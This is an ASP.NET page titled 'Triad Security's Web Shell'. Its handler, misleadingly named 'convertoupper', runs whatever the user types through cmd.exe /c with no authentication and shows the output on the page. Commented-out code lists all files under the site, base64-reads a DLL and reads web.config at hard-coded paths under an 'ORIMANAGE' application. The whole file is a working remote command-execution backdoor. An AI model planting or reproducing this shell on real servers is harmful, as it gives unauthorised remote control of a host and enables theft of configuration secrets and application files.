<!-- directives -->
<% @Page Language="C#" %>
<%@ Import Namespace="System.Net.Http" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Configuration" %>
<%@ Import Namespace="System.Diagnostics" %>

<!-- code section -->
<script runat="server">

private void convertoupper(object sender, EventArgs e)
	{
		/*string str = this.GetType().Assembly.Location;
		string texto = "AAAAAA";
		string[] allfiles = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.*", SearchOption.AllDirectories);
		foreach (string file in allfiles){
			str += file + "    ";
		}*/
		//changed_text.InnerHtml = str.ToUpper();
		
		/*string text = System.Convert.ToBase64String(System.IO.File.ReadAllBytes(@"C:\INETPUB\WWWROOT\ORIMANAGE\BIN\ORISYSTEMMANAGEAPI.DLL", Encoding.UTF8));
		
		GetFile.InnerHtml = text.ToUpper() + texto.ToUpper();*/
		
		/*long length = new System.IO.FileInfo("C:\\INETPUB\\WWWROOT\\ORIMANAGE\\WEB.CONFIG").Length;
		GetFile.InnerHtml = length;*/
		/*
		String path = ConfigurationManager.AppSettings["C:\\INETPUB\\WWWROOT\\ORIMANAGE\\WEB.CONFIG"];
		GetFile.InnerHtml = path.ToUpper() + texto.ToUpper();*/
		
		Process p = new Process();
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.StandardOutputEncoding = System.Text.Encoding.UTF8;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c "+command.Value;
		p.Start();
		p.WaitForExit();
		string output = p.StandardOutput.ReadToEnd();
		if (output != ""){
			GetResults.InnerHtml = output;
			GetResults.Visible = true;
			GetError.Visible = false;
		}
		else{
			GetError.Visible = true;
			GetResults.InnerHtml = "";
			GetError.InnerHtml = p.StandardError.ReadToEnd();
		}
	}
</script>

<!-- Layout -->
<html>
	<head> 
      <title> Triad Security's Web Shell </title> 
		<style>
		body {background-color: powderblue;}
		h1   {color: blue;}
		h3   {text-align: center; 
				font-family: 'Lato', sans-serif; 
				font-size: 34px; 
				font-weight: 300; 
				line-height: 28px; 
				margin: 0 0 18px;}
		p    {color: black;}
		input[type=text], select {
			width: 100%;
			padding: 12px 20px;
			margin: 8px 0;
			display: inline-block;
			border: 1px solid #ccc;
			border-radius: 4px;
			box-sizing: border-box;
		}

		input[type=submit] {
			width: 100%;
			background-color: #4CAF50;
			color: white;
			padding: 14px 20px;
			margin: 8px 0;
			border: none;
			border-radius: 4px;
			cursor: pointer;
		}

		input[type=submit]:hover {
			background-color: #45a049;
		}

		#mydiv {
			border-radius: 5px;
			background-color: #f2f2f2;
			padding: 20px;
		}
		</style>
	</head>
	<body>
		<h3>Triad Security's Web Shell</h3>
			<div id="mydiv">
				<form runat="server">
					<input runat="server" id="command" name="command" type="text" placeholder="Enter Windows OS command" /> 
					<input runat="server" id="button1" type="submit" value="Send"  OnServerClick="convertoupper"/><hr />
					<h4>Results:</h4> 
					<span id="GetResults" runat="server"></span>
					<h5>Errors:</h5>
					<span id="GetError" runat="server"></span>
				</form>
			</div>
	</body>   
</html>
